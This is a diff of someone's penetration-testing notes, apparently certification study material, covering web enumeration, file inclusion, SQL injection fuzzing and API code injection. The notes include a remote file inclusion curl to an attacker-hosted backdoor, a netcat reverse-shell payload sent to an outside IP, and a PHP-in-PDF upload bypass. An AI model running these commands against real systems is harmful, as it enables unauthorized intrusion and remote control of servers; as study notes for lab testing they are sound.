@@ -47,6 +47,8 @@ nikto --host $ip -ssl -evasion 1
 
 https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
 
+KNOW THAT YOU CAN PIVOT TO WHOEVER IS RUNNING HTE WEBSERVER ONCE YOU HAVE INITIAL ACCESS. or write abilities in a web folder.
+
 6. WordPress
 
 WPscan if it's wordpress
@@ -209,6 +211,7 @@ curl "http://example.com/subdir/index.php?page=http://$YOUR_IP/simple-backdoor.p
 THINK ABOUT RCE WHENEVER YOU HAVE LFI.
 
 THINK ABOUT LOCAL FILE INCLUSION.
+
 
 For PDF bypass, try to add the "%PHP-1.7\n%" thing at the top and change the name to reverse.pdf.php.
 
@@ -384,6 +387,12 @@ If you run into an api, start testing with curl. If csrf is there, execute code.
 ```bash
 curl -si --data "code=1+1" # {7*7}...
 curl http://192.168.195.117:50000/verify -si --data "code=os.system('nc -c bash 192.168.45.178 50000')"
+```
+
+SQLi.
+
+```bash
+ffuf -request sql.req -request-proto http -w ~/repos/offsec/lists/sqli.txt:FUZZ
 ```
 
 #### Retrieve cookie, response headers
